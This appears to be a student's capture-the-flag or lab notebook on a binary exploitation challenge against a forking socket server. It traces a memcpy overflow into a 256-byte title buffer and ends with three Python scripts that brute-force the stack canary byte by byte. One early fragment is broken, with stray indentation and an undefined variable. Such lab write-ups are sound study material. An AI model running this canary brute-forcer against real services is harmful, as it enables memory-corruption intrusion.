
# Understanding the challenge 

![[Pasted image 20260710135721.png]]


Defeat Non-Executable stack 

Ret 2 lib - RECOMMENDED
Rop 

Defeat Stack Canary 

Brute - force 
guessing 

![[Pasted image 20260710140057.png]]
# How the code functions

https://linux.die.net/man/1/nc

![[Pasted image 20260710142437.png]]
![[Pasted image 20260710142747.png]]



![[Pasted image 20260710142256.png]]
![[Pasted image 20260710142839.png]]

## Code


![[Pasted image 20260710140550.png]]

![[Pasted image 20260710140611.png]]
![[Pasted image 20260710140842.png]]
![[Pasted image 20260710140914.png]]
![[Pasted image 20260710140935.png]]

# Finding the vulnerability

![[Pasted image 20260710150634.png]]

![[Pasted image 20260710150711.png]]
 So i know buf_size 512 is allocated. 

This is called once per connection (remember, `main()` forks a new child for every `accept()`, and each child calls `process(accept_sock)` on its own copy of this socket). `buf` is a 512-byte array sitting on this function's stack frame.

len = read(sock, buf, CHUNK_SIZE);

`read()` does _not_ null-terminate anything, and it doesn't care what's in the bytes — it just copies raw bytes off the socket into `buf`. So if you send `"hi"`, `len` is 2, and only the first 2 bytes of `buf` are meaningfully set — the rest of `buf` still has leftover stack garbage from whatever used that memory before.  This function's own `read()` is capped safely at `CHUNK_SIZE`, so there's no overflow here directly

read(sock, buf, CHUNK_SIZE);
     ^      ^      ^
     |      |      |
     |      |      +-- "read AT MOST this many bytes"
     |      +--------- "put the bytes HERE" (destination address)
     +---------------- "read FROM this file descriptor"

if (len == -1) {
        die_perror("Cannot read from socket");
    } else if (len == 0) {
        puts("Received nothing, moving along");
    } else { /* Small reads are okay. */


Now the next 
![[Pasted image 20260710163408.png]]

judge is a function which is not in the code neither is judge_good here 

In the function anime.c you can see here 

![[Pasted image 20260710163522.png]]


I got to check_anime 

![[Pasted image 20260710163549.png]]

then there is this get_title 

![[Pasted image 20260710162441.png]]

now though memcpy has len it is back track through len like int len is in check_anime which is called in judge and in the process  you see len = strlen(buf) + 1

that means len 513 around 

![[Pasted image 20260710165913.png]]

now the get_title has title, buf , len 

we have the memcpy which just checks out, in and len 

which maps to memcpy(title, buf, len)

which the size of title in anime.c is 


![[Pasted image 20260710163847.png]]


and that in judge is this 

![[Pasted image 20260710164044.png]]

but it says char title[CHUNK_SIZE]
and  CHUNK_SIZE  is 256 

let me check overwriting it 

![[Pasted image 20260710165403.png]]

![[Pasted image 20260710165339.png]]

![[Pasted image 20260710165252.png]]


# Buffer size is 257. 

# Finding the canary 

import socket

# Example connection setup for a local UNIX domain socket


socket_path = "~/judge_sock"

OFFSET_TO_CANARY = 256

payload = b"A" * (OFFSET_TO_CANARY - 1)
    payload += b"\n"
    payload += prefix
    

def test_payload(payload ):
    try:
        # Establish connection to the local service
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.connect(socket_path)
        
        # Dispatch test sequence
        s.sendall(payload)
        
        # Check response behavior to see if child survived
        response = s.recv(1024)
        s.close()
        
        # If the server responds instead of resetting, the canary byte is intact
        return len(response) > 0
    except (socket.error, ConnectionResetError):
        # A crash indicates a canary mismatch triggering termination
        return False



import socket
import sys

Path to the UNIX domain socket
SOCKET_PATH = "/tmp/example_socket"

def test_payload(payload):
    """
    Sends a payload to the socket and determines if the process survived.
    Returns True if the process handles the input normally, False if it crashes.
    """
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.connect(SOCKET_PATH)
        s.sendall(payload)
        
        # Look for signs of life (e.g., any response or clean closure)
        response = s.recv(1024)
        s.close()
        return True
    except (socket.error, ConnectionResetError, BrokenPipeError):
        # A socket error indicates the child process was terminated prematurely
        return False

def extract_canary(padding_size):
    print(f"[*] Starting canary extraction with padding size: {padding_size}")
    
    # On Linux x86 systems, the first byte of the canary is always a null byte
    known_canary = bytearray([0x00])
    
    # A 32-bit canary has 4 bytes total. Since byte 1 is known (\x00), 
    # we need to find bytes 2, 3, and 4.
    for byte_index in range(2, 5):
        print(f"[*] Brute-forcing byte {byte_index}...")
        byte_found = False
        
        # Test every possible value for the current byte position (0 to 255)
        for candidate in range(256):
            # Construct the trial payload: 
            # [Padding to boundary] + [Known correct bytes] + [Current guess]
            trial_canary = known_canary + bytes([candidate])
            payload = b"A" * padding_size + trial_canary
            
            # Send the payload and check if the canary check passed
            if test_payload(payload):
                known_canary.append(candidate)
                print(f"[+] Found byte {byte_index}: {hex(candidate)}")
                byte_found = True
                break  # Exit the inner loop; move to the next byte position
                
        if not byte_found:
            print(f"[-] Failed to find byte {byte_index}. The server may have restarted.")
            sys.exit(1)
            
    print(f"[+] Extraction complete! Canary found: {known_canary.hex()}")
    return bytes(known_canary)

if __name__ == "__main__":
    # Adjust padding size based on your specific compiler alignment findings
    PADDING_SIZE = 260 
    canary = extract_canary(PADDING_SIZE)



import socket
import os
import sys


socket_path = os.path.expanduser("~/judge_sock")
OFFSET_TO_CANARY = 256

def test_payload(payload):
    try:
        # Establish connection to the local service
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.connect(socket_path)
        
        # Dispatch test sequence
        s.sendall(payload)
        
        # Check response behavior to see if child survived
        response = s.recv(1024)
        s.close()
        
        # If the server responds instead of resetting, the canary byte is intact
        return len(response) > 0
    except (socket.error, ConnectionResetError, BrokenPipeError):
        # A crash indicates a canary mismatch triggering termination
        return False

def run_extraction():
    print(f"[*] Beginning canary brute-force targeting: {socket_path}")
    
    # Initialize prefix with the known Linux x86 null byte
    prefix = bytearray([0x00])
    
    # Loop to find the remaining 3 bytes of the 32-bit canary
    for byte_num in range(2, 5):
        print(f"[*] Searching for canary byte #{byte_num}...")
        byte_found = False
        
        for candidate in range(256):
            # Formulate the trial prefix using currently found bytes + the guess
            current_guess = prefix + bytes([candidate])
            
            # Construct the payload using your defined layout
            payload = b"A" * (OFFSET_TO_CANARY - 1)
            payload += b"\n"
            payload += current_guess
            
            # Send and evaluate process survival
            if test_payload(payload):
                prefix.append(candidate)
                print(f"[+] Discovered byte #{byte_num}: {hex(candidate)}")
                byte_found = True
                break  # Progress to the next byte position
                
        if not byte_found:
            print("[-] Error: Could not determine byte value. Server state may have shifted.")
            sys.exit(1)
            
    # Format and present the final result
    final_canary = bytes(prefix)
    print("\n" + "="*40)
    print(f"[+] SUCCESS! Full Canary Extracted: 0x{final_canary.hex()}")
    print("="*40)
    return final_canary

if __name__ == "__main__":
    run_extraction()
